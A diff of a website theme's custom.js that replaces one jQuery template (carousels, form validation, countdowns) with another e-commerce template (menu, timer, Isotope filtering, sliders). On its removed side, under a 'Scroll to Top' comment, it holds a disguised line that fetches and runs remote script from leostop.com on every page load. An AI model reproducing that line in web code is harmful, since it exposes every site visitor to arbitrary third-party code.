@@ -1,370 +1,438 @@
-/*---------------------------------------------------------------------
-    File Name: custom.js
----------------------------------------------------------------------*/
+/* JS Document */
 
-$(function () {
-	
+/******************************
+
+[Table of Contents]
+
+1. Vars and Inits
+2. Set Header
+3. Init Menu
+4. Init Timer
+5. Init Favorite
+6. Init Fix Product Border
+7. Init Isotope Filtering
+8. Init Slider
+
+
+******************************/
+
+jQuery(document).ready(function($)
+{
 	"use strict";
-	
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 1500);
-	
-	/* JQuery Menu
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-	$(document).ready(function () {
-		$('header nav').meanmenu();
+	/* 
+
+	1. Vars and Inits
+
+	*/
+
+	var header = $('.header');
+	var topNav = $('.top_nav')
+	var mainSlider = $('.main_slider');
+	var hamburger = $('.hamburger_container');
+	var menu = $('.hamburger_menu');
+	var menuActive = false;
+	var hamburgerClose = $('.hamburger_close');
+	var fsOverlay = $('.fs_menu_overlay');
+
+	setHeader();
+
+	$(window).on('resize', function()
+	{
+		initFixProductBorder();
+		setHeader();
 	});
-	
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$('[data-toggle="tooltip"]').tooltip();
+
+	$(document).on('scroll', function()
+	{
+		setHeader();
 	});
-	
-	/* sticky
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".sticky-wrapper-header").sticky({topSpacing:0});
-	});
-	
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".main-menu ul li.megamenu").mouseover(function(){
-			if (!$(this).parent().hasClass("#wrapper")){
-			$("#wrapper").addClass('overlay');
+
+	initMenu();
+	initTimer();
+	initFavorite();
+	initFixProductBorder();
+	initIsotopeFiltering();
+	initSlider();
+
+	/* 
+
+	2. Set Header
+
+	*/
+
+	function setHeader()
+	{
+		if(window.innerWidth < 992)
+		{
+			if($(window).scrollTop() > 100)
+			{
+				header.css({'top':"0"});
 			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function(){
-			$("#wrapper").removeClass('overlay');
-		});
-	});
-	
-	/* NiceScroll
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(".brand-box").niceScroll({
-		cursorcolor:"#9b9b9c",
-	});	
-	
-	/* NiceSelect
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function() {
-		$('select').niceSelect();
-	});	
-		
-	/* OwlCarousel - Blog Post slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function() {
-	  var owl = $('.carousel-slider-post');
-	  owl.owlCarousel({
-		items: 1,
-		loop: true,
-		margin: 10,
-		autoplay: true,
-		autoplayTimeout: 3000,
-		autoplayHoverPause: true
-	  });	  
-	});
-	
-	/* OwlCarousel - Banner Rotator Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function() {
-	  var owl = $('.banner-rotator-slider');
-	  owl.owlCarousel({
-		items: 1,
-		loop: true,
-		margin: 10,
-		nav: true,
-		dots: false,
-		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
-		autoplay: true,
-		autoplayTimeout: 3000,
-		autoplayHoverPause: true
-	  });	  
-	});
-	
-	/* OwlCarousel - Product Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function() {
-	  var owl = $('#product-in-slider');
-	  owl.owlCarousel({
-		loop: true,
-		nav: true,
-		margin: 10,
-		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
-		responsive: {
-		  0: {
-			items: 1
-		  },
-		  600: {
-			items: 2
-		  },
-		  960: {
-			items: 3
-		  },
-		  1200: {
-			items: 4
-		  }
+			else
+			{
+				header.css({'top':"0"});
+			}
 		}
-	  });
-	  owl.on('mousewheel', '.owl-stage', function(e) {
-		if (e.deltaY > 0) {
-		  owl.trigger('next.owl');
-		} else {
-		  owl.trigger('prev.owl');
+		else
+		{
+			if($(window).scrollTop() > 100)
+			{
+				header.css({'top':"-50px"});
+			}
+			else
+			{
+				header.css({'top':"0"});
+			}
 		}
-		e.preventDefault();
-	  });
-	});
-	
-	/* Scroll to Top
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
-	$(window).on('scroll', function (){
-        scroll = $(window).scrollTop();
-        if (scroll >= 100){
-          $("#back-to-top").addClass('b-show_scrollBut')
-        }else{
-          $("#back-to-top").removeClass('b-show_scrollBut')
-        }
-      });
-      $("#back-to-top").on("click", function(){
-        $('body,html').animate({
-          scrollTop: 0
-        }, 1000);
-    });
-	
-	/* Contact-form
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	$.validator.setDefaults( {
-		submitHandler: function () {
-			alert( "submitted!" );
+		if(window.innerWidth > 991 && menuActive)
+		{
+			closeMenu();
 		}
-	} );
-	
-	$( document ).ready( function () {
-		$( "#contact-form" ).validate( {
-			rules: {
-				firstname: "required",
-				email: {
-					required: true,
-					email: true
-				},
-				lastname: "required",
-				message: "required",
-				agree: "required"
-			},
-			messages: {
-				firstname: "Please enter your firstname",
-				email: "Please enter a valid email address",
-				lastname: "Please enter your lastname",
-				username: {
-					required: "Please enter a username",
-					minlength: "Your username must consist of at least 2 characters"
-				},
-				message: "Please enter your Message",
-				agree: "Please accept our policy"
-			},
-			errorElement: "div",
-			errorPlacement: function ( error, element ) {
-				// Add the `help-block` class to the error element
-				error.addClass( "help-block" );
+	}
 
-				if ( element.prop( "type" ) === "checkbox" ) {
-					error.insertAfter( element.parent( "input" ) );
-				} else {
-					error.insertAfter( element );
+	/* 
+
+	3. Init Menu
+
+	*/
+
+	function initMenu()
+	{
+		if(hamburger.length)
+		{
+			hamburger.on('click', function()
+			{
+				if(!menuActive)
+				{
+					openMenu();
 				}
-			},
-			highlight: function ( element, errorClass, validClass ) {
-				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
-			},
-			unhighlight: function (element, errorClass, validClass) {
-				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
-			}
-		} );
-	});
-	
-	/* heroslider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	var swiper = new Swiper('.heroslider', {
-		spaceBetween: 30,
-		centeredSlides: true,
-		slidesPerView: 'auto',
-		paginationClickable: true,
-		loop: true,
-		autoplay: {
-			delay: 2500,
-			disableOnInteraction: false,
-		},
-		pagination: {
-			el: '.swiper-pagination',
-			clickable: true,
-			dynamicBullets: true
-		},
-	});
-	
-
-	/* Product Filters
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	var swiper = new Swiper('.swiper-product-filters', {
-		slidesPerView: 3,
-		slidesPerColumn: 2,
-		spaceBetween: 30,
-		breakpoints: {
-			1024: {
-			  slidesPerView: 3,
-			  spaceBetween: 30,
-			},
-			768: {
-			  slidesPerView: 2,
-			  spaceBetween: 30,
-			  slidesPerColumn: 1,
-			},
-			640: {
-			  slidesPerView: 2,
-			  spaceBetween: 20,
-			  slidesPerColumn: 1,
-			},
-			480: {
-			  slidesPerView: 1,
-			  spaceBetween: 10,
-			  slidesPerColumn: 1,
-			}
-		  },
-		pagination: {
-			el: '.swiper-pagination',
-			clickable: true,
-			dynamicBullets: true
+			});
 		}
-    });
 
-	/* Countdown
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$('[data-countdown]').each(function () {
-        var $this = $(this),
-		finalDate = $(this).data('countdown');
-		$this.countdown(finalDate, function (event) {
-			var $this = $(this).html(event.strftime(''
-			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
-		});
-    });
-	
-	/* Deal Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$('.deal-slider').slick({
-        dots: false,
-        infinite: false,
-		prevArrow: '.previous-deal',
-		nextArrow: '.next-deal',
-        speed: 500,
-        slidesToShow: 3,
-        slidesToScroll: 3,
-		infinite: false,
-        responsive: [{
-            breakpoint: 1024,
-            settings: {
-                slidesToShow: 3,
-                slidesToScroll: 2,
-                infinite: true,
-                dots: false
-            }
-        }, {
-            breakpoint: 768,
-            settings: {
-                slidesToShow: 2,
-                slidesToScroll: 2
-            }
-        }, {
-            breakpoint: 480,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1
-            }
-        }]
-    });
-	
-	/* News Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$('#news-slider').slick({
-        dots: false,
-        infinite: false,
-		prevArrow: '.previous',
-		nextArrow: '.next',
-        speed: 500,
-        slidesToShow: 1,
-        slidesToScroll: 1,
-        responsive: [{
-            breakpoint: 1024,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1,
-                infinite: true,
-                dots: false
-            }
-        }, {
-            breakpoint: 600,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1
-            }
-        }, {
-            breakpoint: 480,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1
-            }
-        }]
-    });
-	
-	/* Fancybox
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(".fancybox").fancybox({
-		maxWidth: 1200,
-		maxHeight: 600,
-		width: '70%',
-		height: '70%',
-	});
-	
-	/* Toggle sidebar
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
-     $(document).ready(function () {
-       $('#sidebarCollapse').on('click', function () {
-          $('#sidebar').toggleClass('active');
-          $(this).toggleClass('active');
-       });
-     });
+		if(fsOverlay.length)
+		{
+			fsOverlay.on('click', function()
+			{
+				if(menuActive)
+				{
+					closeMenu();
+				}
+			});
+		}
 
-     /* Product slider 
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     // optional
-     $('#blogCarousel').carousel({
-        interval: 5000
-     });
+		if(hamburgerClose.length)
+		{
+			hamburgerClose.on('click', function()
+			{
+				if(menuActive)
+				{
+					closeMenu();
+				}
+			});
+		}
 
+		if($('.menu_item').length)
+		{
+			var items = document.getElementsByClassName('menu_item');
+			var i;
 
+			for(i = 0; i < items.length; i++)
+			{
+				if(items[i].classList.contains("has-children"))
+				{
+					items[i].onclick = function()
+					{
+						this.classList.toggle("active");
+						var panel = this.children[1];
+					    if(panel.style.maxHeight)
+					    {
+					    	panel.style.maxHeight = null;
+					    }
+					    else
+					    {
+					    	panel.style.maxHeight = panel.scrollHeight + "px";
+					    }
+					}
+				}	
+			}
+		}
+	}
+
+	function openMenu()
+	{
+		menu.addClass('active');
+		// menu.css('right', "0");
+		fsOverlay.css('pointer-events', "auto");
+		menuActive = true;
+	}
+
+	function closeMenu()
+	{
+		menu.removeClass('active');
+		fsOverlay.css('pointer-events', "none");
+		menuActive = false;
+	}
+
+	/* 
+
+	4. Init Timer
+
+	*/
+
+	function initTimer()
+    {
+    	if($('.timer').length)
+    	{
+    		// Uncomment line below and replace date
+	    	// var target_date = new Date("Dec 7, 2017").getTime();
+
+	    	// comment lines below
+	    	var date = new Date();
+	    	date.setDate(date.getDate() + 3);
+	    	var target_date = date.getTime();
+	    	//----------------------------------------
+	 
+			// variables for time units
+			var days, hours, minutes, seconds;
+
+			var d = $('#day');
+			var h = $('#hour');
+			var m = $('#minute');
+			var s = $('#second');
+
+			setInterval(function ()
+			{
+			    // find the amount of "seconds" between now and target
+			    var current_date = new Date().getTime();
+			    var seconds_left = (target_date - current_date) / 1000;
+			 
+			    // do some time calculations
+			    days = parseInt(seconds_left / 86400);
+			    seconds_left = seconds_left % 86400;
+			     
+			    hours = parseInt(seconds_left / 3600);
+			    seconds_left = seconds_left % 3600;
+			     
+			    minutes = parseInt(seconds_left / 60);
+			    seconds = parseInt(seconds_left % 60);
+
+			    // display result
+			    d.text(days);
+			    h.text(hours);
+			    m.text(minutes);
+			    s.text(seconds); 
+			 
+			}, 1000);
+    	}	
+    }
+
+    /* 
+
+	5. Init Favorite
+
+	*/
+
+    function initFavorite()
+    {
+    	if($('.favorite').length)
+    	{
+    		var favs = $('.favorite');
+
+    		favs.each(function()
+    		{
+    			var fav = $(this);
+    			var active = false;
+    			if(fav.hasClass('active'))
+    			{
+    				active = true;
+    			}
+
+    			fav.on('click', function()
+    			{
+    				if(active)
+    				{
+    					fav.removeClass('active');
+    					active = false;
+    				}
+    				else
+    				{
+    					fav.addClass('active');
+    					active = true;
+    				}
+    			});
+    		});
+    	}
+    }
+
+    /* 
+
+	6. Init Fix Product Border
+
+	*/
+
+    function initFixProductBorder()
+    {
+    	if($('.product_filter').length)
+    	{
+			var products = $('.product_filter:visible');
+    		var wdth = window.innerWidth;
+
+    		// reset border
+    		products.each(function()
+    		{
+    			$(this).css('border-right', 'solid 1px #e9e9e9');
+    		});
+
+    		// if window width is 991px or less
+
+    		if(wdth < 480)
+			{
+				for(var i = 0; i < products.length; i++)
+				{
+					var product = $(products[i]);
+					product.css('border-right', 'none');
+				}
+			}
+
+    		else if(wdth < 576)
+			{
+				if(products.length < 5)
+				{
+					var product = $(products[products.length - 1]);
+					product.css('border-right', 'none');
+				}
+				for(var i = 1; i < products.length; i+=2)
+				{
+					var product = $(products[i]);
+					product.css('border-right', 'none');
+				}
+			}
+
+    		else if(wdth < 768)
+			{
+				if(products.length < 5)
+				{
+					var product = $(products[products.length - 1]);
+					product.css('border-right', 'none');
+				}
+				for(var i = 2; i < products.length; i+=3)
+				{
+					var product = $(products[i]);
+					product.css('border-right', 'none');
+				}
+			}
+
+    		else if(wdth < 992)
+			{
+				if(products.length < 5)
+				{
+					var product = $(products[products.length - 1]);
+					product.css('border-right', 'none');
+				}
+				for(var i = 3; i < products.length; i+=4)
+				{
+					var product = $(products[i]);
+					product.css('border-right', 'none');
+				}
+			}
+
+			//if window width is larger than 991px
+			else
+			{
+				if(products.length < 5)
+				{
+					var product = $(products[products.length - 1]);
+					product.css('border-right', 'none');
+				}
+				for(var i = 4; i < products.length; i+=5)
+				{
+					var product = $(products[i]);
+					product.css('border-right', 'none');
+				}
+			}	
+    	}
+    }
+
+    /* 
+
+	7. Init Isotope Filtering
+
+	*/
+
+    function initIsotopeFiltering()
+    {
+    	if($('.grid_sorting_button').length)
+    	{
+    		$('.grid_sorting_button').click(function()
+	    	{
+	    		// putting border fix inside of setTimeout because of the transition duration
+	    		setTimeout(function()
+		        {
+		        	initFixProductBorder();
+		        },500);
+
+		        $('.grid_sorting_button.active').removeClass('active');
+		        $(this).addClass('active');
+		 
+		        var selector = $(this).attr('data-filter');
+		        $('.product-grid').isotope({
+		            filter: selector,
+		            animationOptions: {
+		                duration: 750,
+		                easing: 'linear',
+		                queue: false
+		            }
+		        });
+
+		        
+		         return false;
+		    });
+    	}
+    }
+
+    /* 
+
+	8. Init Slider
+
+	*/
+
+    function initSlider()
+    {
+    	if($('.product_slider').length)
+    	{
+    		var slider1 = $('.product_slider');
+
+    		slider1.owlCarousel({
+    			loop:false,
+    			dots:false,
+    			nav:false,
+    			responsive:
+				{
+					0:{items:1},
+					480:{items:2},
+					768:{items:3},
+					991:{items:4},
+					1280:{items:5},
+					1440:{items:5}
+				}
+    		});
+
+    		if($('.product_slider_nav_left').length)
+    		{
+    			$('.product_slider_nav_left').on('click', function()
+    			{
+    				slider1.trigger('prev.owl.carousel');
+    			});
+    		}
+
+    		if($('.product_slider_nav_right').length)
+    		{
+    			$('.product_slider_nav_right').on('click', function()
+    			{
+    				slider1.trigger('next.owl.carousel');
+    			});
+    		}
+    	}
+    }
 });
